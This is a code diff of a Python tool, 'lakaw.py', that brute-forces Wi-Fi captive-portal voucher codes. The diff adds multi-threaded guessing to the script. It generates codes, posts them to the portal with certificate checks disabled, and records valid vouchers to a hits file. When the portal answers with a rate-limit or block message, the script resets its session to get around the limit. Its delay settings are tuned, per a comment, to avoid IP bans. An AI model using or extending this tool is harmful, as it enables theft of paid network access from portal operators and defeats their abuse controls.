@@ -1,4 +1,4 @@
-# lakaw.py (KAVIN FAST SPEED - Auto-Heal Turbo Edition)
+# lakaw.py (KAVIN FAST SPEED - Multi-Threaded Edition)
 import os
 import time
 import json
@@ -10,6 +10,7 @@ import html
 import requests
 import urllib3
 import sys
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, parse_qs, urljoin
 from rich.console import Console
 from rich.layout import Layout
@@ -27,17 +28,18 @@ DB_FILE = "lakaw_data.db"
 STATE_FILE = "lakaw_state.json"
 HITS_FILE = "hits.txt"
 
-# ⚡ Turbo Speed & Anti-Ban Optimization
-BASE_SLEEP_MIN = 0.001
-BASE_SLEEP_MAX = 0.005
+# ⚡ Worker နှင့် Speed ဆက်တင် (IP မခံရအောင် ထိန်ညှိထားသည်)
+MAX_WORKERS = 3
+BASE_SLEEP_MIN = 0.05
+BASE_SLEEP_MAX = 0.1
 RATE_LIMIT_SLEEP = 30
-NETWORK_RETRY_SLEEP = 0.5
+NETWORK_RETRY_SLEEP = 1.0
 SESSION_REFRESH_SLEEP = 1.0
 
 console = Console()
 session = requests.Session()
 session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36"})
-adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=3)
+adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=50, max_retries=3)
 session.mount('http://', adapter)
 session.mount('https://', adapter)
 
@@ -118,7 +120,6 @@ def extract_session(value):
         return m.group(1) if m else None
     except Exception: return None
 
-# ⚡ Auto-Heal Session: Wi-Fi ချိတ်ထားရင် Portal အလိုအလျောက်ရှာမယ်
 def fetch_session(custom_url=""):
     if custom_url:
         try:
@@ -166,11 +167,10 @@ def test_code(portal_base, session_id, code):
     headers = {"Content-Type": "application/json", "Origin": portal_base}
     payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
     try:
-        r = session.post(url, json=payload, headers=headers, timeout=1.0, verify=False)
+        r = session.post(url, json=payload, headers=headers, timeout=2.0, verify=False)
         return r.text if r.text else "__NETWORK_ERROR__"
     except Exception: return "__NETWORK_ERROR__"
 
-# ကုဒ်ဖန်တီးမယ့် စနစ် (Prefix မပါတော့ပါ)
 _seq_counter = 0
 def gen_code(mode, length, scan_method="random"):
     global _seq_counter
@@ -273,7 +273,7 @@ def scan_loop(mode, length, custom_url="", scan_method="random", start_tested=0,
     last_time, speed_counter, current_speed = time.time(), 0, 0.0
 
     try:
-        push_log(f"[bold bright_cyan]Auto-Heal ON | Method: {scan_method.upper()}[/bold bright_cyan]")
+        push_log(f"[bold bright_cyan]Multi-Thread Engine ON | Method: {scan_method.upper()}[/bold bright_cyan]")
         while True:
             try:
                 if not session_id or not portal_base:
@@ -285,62 +285,66 @@ def scan_loop(mode, length, custom_url="", scan_method="random", start_tested=0,
                         session_id = "auto_session"
                     net_error_streak = 0
 
-                code = gen_code(mode, length, scan_method)
-                if not code or is_tried(conn, code): continue
+                # Generate Batch of Codes
+                batch_codes = []
+                while len(batch_codes) < MAX_WORKERS * 2:
+                    c = gen_code(mode, length, scan_method)
+                    if c and not is_tried(conn, c):
+                        mark_tried(conn, c)
+                        batch_codes.append(c)
 
-                mark_tried(conn, code)
-                tested += 1
-                save_state(mode_str, tested, hits, custom_url, scan_method)
+                if not batch_codes: continue
 
-                speed_counter += 1
-                now = time.time()
-                if now - last_time >= 1.0:
-                    current_speed = (speed_counter / (now - last_time)) * 60
-                    speed_counter, last_time = 0, now
+                success_hit = False
 
-                push_log(f"Testing code: [yellow]{code}[/yellow]")
-                _update(code, "Active", current_speed)
+                # Run in Threads
+                with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
+                    futures = {executor.submit(test_code, portal_base, session_id, code): code for code in batch_codes}
 
-                res = test_code(portal_base, session_id, code)
-                low = (res or "").lower()
-
-                if res == "__NETWORK_ERROR__" or res == "":
-                    net_error_streak += 1
-                    time.sleep(NETWORK_RETRY_SLEEP)
-                    if net_error_streak >= 5:
-                        push_log(f"[bold red]⚠️ Network Issues! Reconnecting...[/bold red]")
-                        session_id = None
-                        net_error_streak = 0
-                    continue
-
-                net_error_streak = 0
-
-                if ("request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low or "forbidden" in low):
-                    _update(code, "Limit", current_speed)
-                    push_log(f"[bold red]🛡️ Block Detected! Auto-changing Session...[/bold red]")
-                    time.sleep(RATE_LIMIT_SLEEP)
-                    session_id = None
-                    continue
-
-                if ("session timed out" in low or "session timeout" in low or '"session":null' in low):
-                    session_id = None
-                    continue
-
-                if '"success":true' in low or '"authresult":"1"' in low:
-                    existing = hits_codes_only(hits)
-                    if code not in existing:
-                        now_str = time.strftime("%H:%M:%S")
-                        hits.append({"code": code, "time": now_str})
-                        push_log(f"[bold bright_green on black] ✨ BINGO! VALID VOUCHER HIT ➔ {code} ✨ [/bold bright_green on black]")
+                    for future in as_completed(futures):
+                        code = futures[future]
+                        tested += 1
                         try:
-                            with open(HITS_FILE, "a", encoding="utf-8") as f: f.write(f"[{now_str}] CODE: {code}\n")
-                        except Exception: pass
-                        save_state(mode_str, tested, hits, custom_url, scan_method)
-                    _update(code, "Active", current_speed)
-                    time.sleep(BASE_SLEEP_MIN)
-                    continue
+                            res = future.result()
+                        except Exception:
+                            continue
 
-                time.sleep(BASE_SLEEP_MIN + random.uniform(0, BASE_SLEEP_MAX))
+                        low = (res or "").lower()
+                        elapsed_total = time.time() - start_time
+                        current_speed = (tested / elapsed_total * 60) if elapsed_total > 0 else 0.0
+
+                        push_log(f"Testing code: [yellow]{code}[/yellow]")
+                        _update(code, "Active", current_speed)
+
+                        if "request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low:
+                            _update(code, "Limit", current_speed)
+                            push_log(f"[bold red]🛡️ Block Detected! Auto-changing Session...[/bold red]")
+                            time.sleep(RATE_LIMIT_SLEEP)
+                            session_id = None
+                            success_hit = True
+                            break
+
+                        if "session timed out" in low or "session timeout" in low or '"session":null' in low:
+                            session_id = None
+                            break
+
+                        if '"success":true' in low or '"authresult":"1"' in low:
+                            existing = hits_codes_only(hits)
+                            if code not in existing:
+                                now_str = time.strftime("%H:%M:%S")
+                                hits.append({"code": code, "time": now_str})
+                                push_log(f"[bold bright_green on black] ✨ BINGO! VALID VOUCHER HIT ➔ {code} ✨ [/bold bright_green on black]")
+                                try:
+                                    with open(HITS_FILE, "a", encoding="utf-8") as f: f.write(f"[{now_str}] CODE: {code}\n")
+                                except Exception: pass
+                                save_state(mode_str, tested, hits, custom_url, scan_method)
+                            _update(code, "Active", current_speed)
+                            success_hit = True
+                            break
+
+                save_state(mode_str, tested, hits, custom_url, scan_method)
+                if success_hit:
+                    time.sleep(0.1)
 
             except KeyboardInterrupt: raise
             except Exception:
